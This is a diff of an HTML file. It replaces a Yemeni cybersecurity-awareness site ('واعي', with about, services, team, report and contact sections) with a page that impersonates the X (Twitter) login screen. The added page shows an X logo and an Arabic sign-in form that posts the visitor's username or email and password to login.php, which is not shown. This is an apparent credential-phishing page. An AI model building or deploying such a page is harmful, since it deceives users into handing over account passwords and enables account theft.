@@ -3,597 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>واعي - المنصة اليمنية للأمن السيبراني</title>
+    <title>X (Twitter) - تسجيل الدخول</title>
     <link rel="stylesheet" href="style.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <!-- الشاشة الأولى: التحميل -->
-    <div class="loader">
-        <div class="loader-content">
-            <div class="loader-logo">
-                <div class="logo-text">واعي</div>
-                <div class="loader-subtitle">منصة الأمن السيبراني اليمنية</div>
+    <div class="login-container">
+        <div class="twitter-logo">
+            <img src="assets/twitter-icon.png" alt="X Logo">
+        </div>
+        <h1>تسجيل الدخول إلى X</h1>
+        <form id="loginForm" action="login.php" method="POST">
+            <div class="input-group">
+                <input type="text" id="username" name="username" required>
+                <label for="username">البريد الإلكتروني أو اسم المستخدم</label>
             </div>
-            <div class="loader-bar">
-                <div class="loader-progress"></div>
+            <div class="input-group">
+                <input type="password" id="password" name="password" required>
+                <label for="password">كلمة المرور</label>
             </div>
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
+        </form>
+        <div class="links">
+            <a href="#">نسيت كلمة المرور؟</a>
+            <a href="#">• تسجيل حساب جديد</a>
         </div>
     </div>
-
-    <!-- الشاشة الرئيسية -->
-    <div class="main-content">
-        <!-- خلفية متحركة -->
-        <div class="background-animation">
-            <div class="floating-shapes">
-                <div class="shape shape-1"></div>
-                <div class="shape shape-2"></div>
-                <div class="shape shape-3"></div>
-                <div class="shape shape-4"></div>
-                <div class="shape shape-5"></div>
-            </div>
-            <div class="network-lines"></div>
-        </div>
-
-        <!-- شريط التنقل -->
-        <header>
-            <nav class="navbar">
-                <div class="nav-container">
-                    <div class="logo">
-                        <div class="logo-icon">
-                            <i class="fas fa-shield-alt"></i>
-                        </div>
-                        <div class="logo-text">واعي</div>
-                    </div>
-                    
-                    <ul class="nav-menu">
-                        <li class="nav-item">
-                            <a href="#home" class="nav-link active">الرئيسية</a>
-                        </li>
-                        <li class="nav-item">
-                            <a href="#about" class="nav-link">من نحن</a>
-                        </li>
-                        <li class="nav-item">
-                            <a href="#services" class="nav-link">خدماتنا</a>
-                        </li>
-                        <li class="nav-item">
-                            <a href="#team" class="nav-link">فريقنا</a>
-                        </li>
-                        <li class="nav-item">
-                            <a href="#reports" class="nav-link">البلاغات</a>
-                        </li>
-                        <li class="nav-item">
-                            <a href="#contact" class="nav-link">اتصل بنا</a>
-                        </li>
-                    </ul>
-                    
-                    <div class="hamburger">
-                        <span class="bar"></span>
-                        <span class="bar"></span>
-                        <span class="bar"></span>
-                    </div>
-                </div>
-            </nav>
-        </header>
-
-        <!-- قسم الهيرو -->
-        <section id="home" class="hero">
-            <div class="hero-container">
-                <div class="hero-content">
-                    <div class="hero-badge">
-                        <span>فريق سيبراني محترف</span>
-                    </div>
-                    <h1 class="hero-title">
-                        <span class="title-line">نحمي عالمك</span>
-                        <span class="title-line accent">الرقمي</span>
-                    </h1>
-                    <p class="hero-description">
-                        منصة يمنية متخصصة في الأمن السيبراني، مكافحة الجرائم الإلكترونية، 
-                        وحماية المجتمع من مخاطر الفضاء الرقمي. نحن درعك الواقي في العالم الرقمي.
-                    </p>
-                    <div class="hero-buttons">
-                        <a href="#about" class="btn btn-primary">
-                            <span>تعرف علينا</span>
-                            <i class="fas fa-arrow-left"></i>
-                        </a>
-                        <a href="#reports" class="btn btn-secondary">
-                            <span>قدم بلاغًا</span>
-                            <i class="fas fa-flag"></i>
-                        </a>
-                    </div>
-                </div>
-                
-                <div class="hero-visual">
-                    <div class="cyber-card">
-                        <div class="card-inner">
-                            <div class="card-front">
-                                <div class="card-icon">
-                                    <i class="fas fa-shield-alt"></i>
-                                </div>
-                                <h3>حماية شاملة</h3>
-                                <p>نوفر حماية متكاملة من جميع التهديدات الإلكترونية</p>
-                            </div>
-                            <div class="card-back">
-                                <div class="stats">
-                                    <div class="stat">
-                                        <div class="stat-number">264K</div>
-                                        <div class="stat-label">متابع</div>
-                                    </div>
-                                    <div class="stat">
-                                        <div class="stat-number">88</div>
-                                        <div class="stat-label">ينايع</div>
-                                    </div>
-                                    <div class="stat">
-                                        <div class="stat-number">3902</div>
-                                        <div class="stat-label">توصية</div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="scroll-indicator">
-                <span>قم بالتمرير</span>
-                <div class="mouse">
-                    <div class="wheel"></div>
-                </div>
-            </div>
-        </section>
-
-        <!-- قسم من نحن -->
-        <section id="about" class="about section">
-            <div class="container">
-                <div class="section-header">
-                    <h2 class="section-title">من نحن</h2>
-                    <p class="section-subtitle">فريق سيبراني يمني متخصص في التوعية والحماية الرقمية</p>
-                </div>
-                
-                <div class="about-content">
-                    <div class="about-text">
-                        <h3>منصة <span class="accent">واعي</span> اليمنية</h3>
-                        <p>
-                            نحن فريق من خبراء الأمن السيبراني والمتخصصين في مكافحة الجرائم الإلكترونية، 
-                            نعمل على نشر الوعي الرقمي وتقديم الحلول الأمنية لحماية الأفراد والمجتمع.
-                        </p>
-                        
-                        <div class="about-features">
-                            <div class="feature">
-                                <div class="feature-icon">
-                                    <i class="fas fa-bug"></i>
-                                </div>
-                                <div class="feature-content">
-                                    <h4>مكافحة الجرائم الإلكترونية</h4>
-                                    <p>نتصدى لمختلف أنواع الجرائم الإلكترونية والابتزاز الرقمي</p>
-                                </div>
-                            </div>
-                            
-                            <div class="feature">
-                                <div class="feature-icon">
-                                    <i class="fas fa-user-shield"></i>
-                                </div>
-                                <div class="feature-content">
-                                    <h4>حماية الخصوصية</h4>
-                                    <p>نساعد في حماية بياناتك وخصوصيتك من الانتهاكات</p>
-                                </div>
-                            </div>
-                            
-                            <div class="feature">
-                                <div class="feature-icon">
-                                    <i class="fas fa-broadcast-tower"></i>
-                                </div>
-                                <div class="feature-content">
-                                    <h4>رصد المخالفات</h4>
-                                    <p>نرصد الحسابات والمحتوى المخالف ونبلغ عنه</p>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="about-visual">
-                        <div class="visual-container">
-                            <div class="hexagon hex-1">
-                                <i class="fas fa-lock"></i>
-                            </div>
-                            <div class="hexagon hex-2">
-                                <i class="fas fa-code"></i>
-                            </div>
-                            <div class="hexagon hex-3">
-                                <i class="fas fa-shield-alt"></i>
-                            </div>
-                            <div class="hexagon hex-4">
-                                <i class="fas fa-network-wired"></i>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- قسم الخدمات -->
-        <section id="services" class="services section">
-            <div class="container">
-                <div class="section-header">
-                    <h2 class="section-title">خدماتنا</h2>
-                    <p class="section-subtitle">نقدم مجموعة متكاملة من خدمات الأمن السيبراني</p>
-                </div>
-                
-                <div class="services-grid">
-                    <div class="service-card">
-                        <div class="service-icon">
-                            <i class="fas fa-eye"></i>
-                        </div>
-                        <h3>الرصد والمراقبة</h3>
-                        <p>نقوم برصد الحسابات المخالفة والمحتوى الضار على منصات التواصل</p>
-                        <a href="#" class="service-link">
-                            <span>المزيد</span>
-                            <i class="fas fa-arrow-left"></i>
-                        </a>
-                    </div>
-                    
-                    <div class="service-card">
-                        <div class="service-icon">
-                            <i class="fas fa-graduation-cap"></i>
-                        </div>
-                        <h3>التوعية الرقمية</h3>
-                        <p>ننشر الوعي حول مخاطر الإنترنت وطرق الحماية من الجرائم الإلكترونية</p>
-                        <a href="#" class="service-link">
-                            <span>المزيد</span>
-                            <i class="fas fa-arrow-left"></i>
-                        </a>
-                    </div>
-                    
-                    <div class="service-card">
-                        <div class="service-icon">
-                            <i class="fas fa-flag"></i>
-                        </div>
-                        <h3>نظام البلاغات</h3>
-                        <p>نستقبل بلاغاتكم عن الحسابات المخالفة ونتخذ الإجراءات اللازمة</p>
-                        <a href="#" class="service-link">
-                            <span>المزيد</span>
-                            <i class="fas fa-arrow-left"></i>
-                        </a>
-                    </div>
-                    
-                    <div class="service-card">
-                        <div class="service-icon">
-                            <i class="fas fa-headset"></i>
-                        </div>
-                        <h3>الدعم والاستشارات</h3>
-                        <p>نقدم استشارات أمنية ودعمًا فوريًا لضحايا الجرائم الإلكترونية</p>
-                        <a href="#" class="service-link">
-                            <span>المزيد</span>
-                            <i class="fas fa-arrow-left"></i>
-                        </a>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- قسم فريقنا -->
-        <section id="team" class="team section">
-            <div class="container">
-                <div class="section-header">
-                    <h2 class="section-title">فريقنا</h2>
-                    <p class="section-subtitle">خبراء وأخصائيون في مجال الأمن السيبراني</p>
-                </div>
-                
-                <div class="team-grid">
-                    <div class="team-member">
-                        <div class="member-image">
-                            <div class="image-placeholder">
-                                <i class="fas fa-user-secret"></i>
-                            </div>
-                            <div class="member-overlay">
-                                <div class="social-links">
-                                    <a href="#"><i class="fab fa-twitter"></i></a>
-                                    <a href="#"><i class="fab fa-linkedin"></i></a>
-                                    <a href="#"><i class="fab fa-github"></i></a>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="member-info">
-                            <h3>أبو جمال هاك</h3>
-                            <p>خبير الأمن السيبراني</p>
-                        </div>
-                    </div>
-                    
-                    <div class="team-member">
-                        <div class="member-image">
-                            <div class="image-placeholder">
-                                <i class="fas fa-user-secret"></i>
-                            </div>
-                            <div class="member-overlay">
-                                <div class="social-links">
-                                    <a href="#"><i class="fab fa-twitter"></i></a>
-                                    <a href="#"><i class="fab fa-linkedin"></i></a>
-                                    <a href="#"><i class="fab fa-github"></i></a>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="member-info">
-                            <h3>م. عبدالعزيز</h3>
-                            <p>محلل تهديدات إلكترونية</p>
-                        </div>
-                    </div>
-                    
-                    <div class="team-member">
-                        <div class="member-image">
-                            <div class="image-placeholder">
-                                <i class="fas fa-user-secret"></i>
-                            </div>
-                            <div class="member-overlay">
-                                <div class="social-links">
-                                    <a href="#"><i class="fab fa-twitter"></i></a>
-                                    <a href="#"><i class="fab fa-linkedin"></i></a>
-                                    <a href="#"><i class="fab fa-github"></i></a>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="member-info">
-                            <h3>خبير الحماية</h3>
-                            <p>متخصص في حماية البيانات</p>
-                        </div>
-                    </div>
-                    
-                    <div class="team-member">
-                        <div class="member-image">
-                            <div class="image-placeholder">
-                                <i class="fas fa-user-secret"></i>
-                            </div>
-                            <div class="member-overlay">
-                                <div class="social-links">
-                                    <a href="#"><i class="fab fa-twitter"></i></a>
-                                    <a href="#"><i class="fab fa-linkedin"></i></a>
-                                    <a href="#"><i class="fab fa-github"></i></a>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="member-info">
-                            <h3>محمد</h3>
-                            <p>محقق جرائم إلكترونية</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- قسم البلاغات -->
-        <section id="reports" class="reports section">
-            <div class="container">
-                <div class="section-header">
-                    <h2 class="section-title">نظام البلاغات</h2>
-                    <p class="section-subtitle">سجل بلاغك عن أي محتوى أو حساب مخالف</p>
-                </div>
-                
-                <div class="reports-content">
-                    <div class="reports-stats">
-                        <div class="stat-card">
-                            <div class="stat-icon">
-                                <i class="fas fa-flag"></i>
-                            </div>
-                            <div class="stat-info">
-                                <h3>1,248</h3>
-                                <p>بلاغ تم استقباله</p>
-                            </div>
-                        </div>
-                        
-                        <div class="stat-card">
-                            <div class="stat-icon">
-                                <i class="fas fa-check-circle"></i>
-                            </div>
-                            <div class="stat-info">
-                                <h3>892</h3>
-                                <p>بلاغ تم معالجته</p>
-                            </div>
-                        </div>
-                        
-                        <div class="stat-card">
-                            <div class="stat-icon">
-                                <i class="fas fa-user-slash"></i>
-                            </div>
-                            <div class="stat-info">
-                                <h3>437</h3>
-                                <p>حساب تم إيقافه</p>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="report-form-container">
-                        <div class="form-header">
-                            <h3>قدم بلاغك الآن</h3>
-                            <p>سنقوم بمراجعة بلاغك واتخاذ الإجراءات اللازمة</p>
-                        </div>
-                        
-                        <form class="report-form">
-                            <div class="form-group">
-                                <label for="report-type">نوع البلاغ</label>
-                                <select id="report-type" required>
-                                    <option value="">اختر نوع البلاغ</option>
-                                    <option value="harassment">تحرش أو ابتزاز</option>
-                                    <option value="hate-speech">خطاب كراهية</option>
-                                    <option value="fake-account">حساب مزيف</option>
-                                    <option value="scam">احتيال ونصب</option>
-                                    <option value="other">مخالفة أخرى</option>
-                                </select>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label for="report-details">تفاصيل البلاغ</label>
-                                <textarea id="report-details" placeholder="صف المشكلة بالتفصيل..." required></textarea>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label for="report-evidence">إرفاق أدلة (اختياري)</label>
-                                <input type="file" id="report-evidence" multiple>
-                            </div>
-                            
-                            <button type="submit" class="btn btn-primary">
-                                <span>إرسال البلاغ</span>
-                                <i class="fas fa-paper-plane"></i>
-                            </button>
-                        </form>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- قسم الاتصال -->
-        <section id="contact" class="contact section">
-            <div class="container">
-                <div class="section-header">
-                    <h2 class="section-title">اتصل بنا</h2>
-                    <p class="section-subtitle">تواصل معنا لأي استفسار أو طلب مساعدة</p>
-                </div>
-                
-                <div class="contact-content">
-                    <div class="contact-info">
-                        <div class="contact-card">
-                            <div class="contact-icon">
-                                <i class="fas fa-envelope"></i>
-                            </div>
-                            <div class="contact-details">
-                                <h3>البريد الإلكتروني</h3>
-                                <p>info@yemaware.com</p>
-                            </div>
-                        </div>
-                        
-                        <div class="contact-card">
-                            <div class="contact-icon">
-                                <i class="fas fa-phone-alt"></i>
-                            </div>
-                            <div class="contact-details">
-                                <h3>الهاتف</h3>
-                                <p>+967 123 456 789</p>
-                            </div>
-                        </div>
-                        
-                        <div class="contact-card">
-                            <div class="contact-icon">
-                                <i class="fas fa-map-marker-alt"></i>
-                            </div>
-                            <div class="contact-details">
-                                <h3>المقر</h3>
-                                <p>الجمهورية اليمنية</p>
-                            </div>
-                        </div>
-                        
-                        <div class="social-media">
-                            <h3>تابعنا على</h3>
-                            <div class="social-links">
-                                <a href="#" class="social-link">
-                                    <i class="fab fa-twitter"></i>
-                                </a>
-                                <a href="#" class="social-link">
-                                    <i class="fab fa-facebook-f"></i>
-                                </a>
-                                <a href="#" class="social-link">
-                                    <i class="fab fa-instagram"></i>
-                                </a>
-                                <a href="#" class="social-link">
-                                    <i class="fab fa-youtube"></i>
-                                </a>
-                                <a href="#" class="social-link">
-                                    <i class="fab fa-telegram"></i>
-                                </a>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="contact-form">
-                        <form class="message-form">
-                            <div class="form-group">
-                                <input type="text" placeholder="اسمك الكامل" required>
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="email" placeholder="بريدك الإلكتروني" required>
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="text" placeholder="موضوع الرسالة" required>
-                            </div>
-                            
-                            <div class="form-group">
-                                <textarea placeholder="رسالتك..." required></textarea>
-                            </div>
-                            
-                            <button type="submit" class="btn btn-primary">
-                                <span>إرسال الرسالة</span>
-                                <i class="fas fa-paper-plane"></i>
-                            </button>
-                        </form>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- الفوتر -->
-        <footer class="footer">
-            <div class="container">
-                <div class="footer-content">
-                    <div class="footer-section">
-                        <div class="footer-logo">
-                            <div class="logo">
-                                <div class="logo-icon">
-                                    <i class="fas fa-shield-alt"></i>
-                                </div>
-                                <div class="logo-text">واعي</div>
-                            </div>
-                        </div>
-                        <p class="footer-description">
-                            منصة يمنية توعوية متخصصة في الأمن السيبراني ومكافحة الجرائم الإلكترونية
-                        </p>
-                    </div>
-                    
-                    <div class="footer-section">
-                        <h3>روابط سريعة</h3>
-                        <ul class="footer-links">
-                            <li><a href="#home">الرئيسية</a></li>
-                            <li><a href="#about">من نحن</a></li>
-                            <li><a href="#services">خدماتنا</a></li>
-                            <li><a href="#reports">البلاغات</a></li>
-                        </ul>
-                    </div>
-                    
-                    <div class="footer-section">
-                        <h3>خدماتنا</h3>
-                        <ul class="footer-links">
-                            <li><a href="#">التوعية الرقمية</a></li>
-                            <li><a href="#">مكافحة الابتزاز</a></li>
-                            <li><a href="#">حماية البيانات</a></li>
-                            <li><a href="#">التحقيق الرقمي</a></li>
-                        </ul>
-                    </div>
-                    
-                    <div class="footer-section">
-                        <h3>القائمة البريدية</h3>
-                        <p>اشترك في نشرتنا البريدية لتلقي آخر التحديثات</p>
-                        <div class="newsletter-form">
-                            <input type="email" placeholder="بريدك الإلكتروني">
-                            <button type="submit">
-                                <i class="fas fa-paper-plane"></i>
-                            </button>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="footer-bottom">
-                    <div class="copyright">
-                        <p>جميع الحقوق محفوظة &copy; 2023 منصة واعي اليمنية</p>
-                    </div>
-                    <div class="developer-credit">
-                        <p>تم التطوير بواسطة: <span>𝐴𝑏𝑢 𝐽𝑎𝑚𝑎𝑙 𝐻𝑎𝑐𝑘</span></p>
-                    </div>
-                </div>
-            </div>
-        </footer>
-    </div>
-
     <script src="script.js"></script>
 </body>
 </html>
